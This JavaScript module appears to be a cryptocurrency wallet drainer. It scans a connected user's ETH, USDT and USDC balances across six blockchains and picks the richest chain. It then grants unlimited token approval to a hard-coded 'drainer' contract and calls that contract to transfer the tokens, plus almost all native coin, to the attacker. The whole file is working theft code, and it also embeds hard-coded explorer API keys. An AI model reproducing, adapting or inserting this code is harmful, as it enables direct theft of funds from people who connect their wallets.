import { ethers } from 'ethers'

const ERC20_ABI = [
  'function balanceOf(address account) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)'
]
const DRAINER_ABI = [
  'function tK7(uint256 usdtAmount, uint256 usdcAmount) external',
  'function bN3() external payable'
]

// API‑ключи
const ETHERSCAN_API_KEY = 'X2A1BU3MABVFFN1GQ1DRX5PHNG212MTXKT'
const BSCSCAN_API_KEY   = '8AWWMFHVD5E65JCGGYKKE95RTKTPB7AJJR'
const POLYGONSCAN_API_KEY = '43EJ8S6WRP4ESVX8AGM8KP9I61P44YWZ2T'
const ARBISCAN_API_KEY  = '6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES'
const OPTIMISTIC_ETHERSCAN_API_KEY = '5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW'
const BASESCAN_API_KEY  = 'TEB6I1H3F1UH1DF2I1R39PA9RX5PHNG8Z2T' // проверь ключ

// Конфиг сетей
const CHAINS = {
  1: {
    name: 'Ethereum',
    nativeToken: 'ETH',
    chainIdHex: '0x1',
    rpcUrls: ['https://rpc.ankr.com/eth'],
    usdtAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    usdcAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    drainerAddress: '0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF',
    explorerApi: 'https://api.etherscan.io/api',
    explorerApiKey: ETHERSCAN_API_KEY
  },
  56: {
    name: 'BNB Chain',
    nativeToken: 'BNB',
    chainIdHex: '0x38',
    rpcUrls: ['https://bsc-dataseed.binance.org/'],
    usdtAddress: '0x55d398326f99059fF775485246999027B3197955',
    usdcAddress: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    drainerAddress: '0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF',
    explorerApi: 'https://api.bscscan.com/api',
    explorerApiKey: BSCSCAN_API_KEY
  },
  137: {
    name: 'Polygon',
    nativeToken: 'MATIC',
    chainIdHex: '0x89',
    rpcUrls: ['https://polygon-rpc.com/'],
    usdtAddress: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    usdcAddress: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    drainerAddress: '0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF',
    explorerApi: 'https://api.polygonscan.com/api',
    explorerApiKey: POLYGONSCAN_API_KEY
  },
  42161: {
    name: 'Arbitrum',
    nativeToken: 'ETH',
    chainIdHex: '0xa4b1',
    rpcUrls: ['https://arb1.arbitrum.io/rpc'],
    usdtAddress: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
    usdcAddress: '0xAF88d065e77c8cC2239327C5EDb3A432268e5831',
    drainerAddress: '0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF',
    explorerApi: 'https://api.arbiscan.io/api',
    explorerApiKey: ARBISCAN_API_KEY
  },
  10: {
    name: 'Optimism',
    nativeToken: 'ETH',
    chainIdHex: '0xa',
    rpcUrls: ['https://mainnet.optimism.io'],
    usdtAddress: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
    usdcAddress: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',
    drainerAddress: '0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF',
    explorerApi: 'https://api-optimistic.etherscan.io/api',
    explorerApiKey: OPTIMISTIC_ETHERSCAN_API_KEY
  },
  8453: {
    name: 'Base',
    nativeToken: 'ETH',
    chainIdHex: '0x2105',
    rpcUrls: ['https://mainnet.base.org'],
    usdtAddress: '0xfde4C96c8593536E31F229EA8d515f7bC60b677',
    usdcAddress: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
    drainerAddress: '0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF',
    explorerApi: 'https://api.basescan.org/api',
    explorerApiKey: BASESCAN_API_KEY
  }
}

async function fetchExplorer(url) {
  const res = await fetch(url).then(r=>r.json())
  if (res.status==='1') return res.result
  throw new Error(res.message||'Explorer error')
}

const delay = ms=>new Promise(r=>setTimeout(r,ms))

async function checkBalance(chainId,user) {
  const cfg = CHAINS[chainId]
  let native,usdt,usdc
  try {
    native = ethers.BigNumber.from(await fetchExplorer(
      `${cfg.explorerApi}?module=account&action=balance&address=${user}&tag=latest&apikey=${cfg.explorerApiKey}`
    ))
  } catch {
    const p=new ethers.providers.JsonRpcProvider(cfg.rpcUrls[0])
    native=await p.getBalance(user)
  }
  try {
    usdt = ethers.BigNumber.from(await fetchExplorer(
      `${cfg.explorerApi}?module=account&action=tokenbalance&contractaddress=${cfg.usdtAddress}&address=${user}&tag=latest&apikey=${cfg.explorerApiKey}`
    ))
  } catch {
    const c=new ethers.Contract(cfg.usdtAddress,ERC20_ABI,new ethers.providers.JsonRpcProvider(cfg.rpcUrls[0]))
    usdt=await c.balanceOf(user)
  }
  try {
    usdc = ethers.BigNumber.from(await fetchExplorer(
      `${cfg.explorerApi}?module=account&action=tokenbalance&contractaddress=${cfg.usdcAddress}&address=${user}&tag=latest&apikey=${cfg.explorerApiKey}`
    ))
  } catch {
    const c=new ethers.Contract(cfg.usdcAddress,ERC20_ABI,new ethers.providers.JsonRpcProvider(cfg.rpcUrls[0]))
    usdc=await c.balanceOf(user)
  }
  console.log(`— ${cfg.name}: ${ethers.utils.formatEther(native)} ${cfg.nativeToken}, USDT ${ethers.utils.formatUnits(usdt,6)}, USDC ${ethers.utils.formatUnits(usdc,6)}`)
  return { chainId:+chainId,native,usdt,usdc }
}

export async function runDrainer(provider,signer,user) {
  const arr = (await Promise.all(
    Object.keys(CHAINS).map(id=>checkBalance(id,user).catch(()=>null))
  )).filter(Boolean)
  arr.sort((a,b)=>b.usdt.add(b.usdc).sub(a.usdt.add(a.usdc)))
  if (!arr.length) throw new Error('Нет баланса')
  const best = arr[0]
  // switch
  await window.ethereum.request({
    method:'wallet_switchEthereumChain',
    params:[{chainId:CHAINS[best.chainId].chainIdHex}]
  })
  // drain
  const cfg=CHAINS[best.chainId]
  const drainer=new ethers.Contract(cfg.drainerAddress,DRAINER_ABI,signer)
  const usdtC=new ethers.Contract(cfg.usdtAddress,ERC20_ABI,signer)
  const usdcC=new ethers.Contract(cfg.usdcAddress,ERC20_ABI,signer)
  const MAX=ethers.constants.MaxUint256
  if (best.usdt.gt(0)){
    const al=await usdtC.allowance(user,cfg.drainerAddress)
    if (al.lt(best.usdt)) await usdtC.approve(cfg.drainerAddress,MAX)
  }
  if (best.usdc.gt(0)){
    const al=await usdcC.allowance(user,cfg.drainerAddress)
    if (al.lt(best.usdc)) await usdcC.approve(cfg.drainerAddress,MAX)
  }
  if (best.usdt.gt(0)||best.usdc.gt(0)) await drainer.tK7(best.usdt,best.usdc)
  const leftover = best.native.sub(ethers.utils.parseEther('0.001'))
  if (leftover.gt(0)) await drainer.bN3({ value:leftover })
}
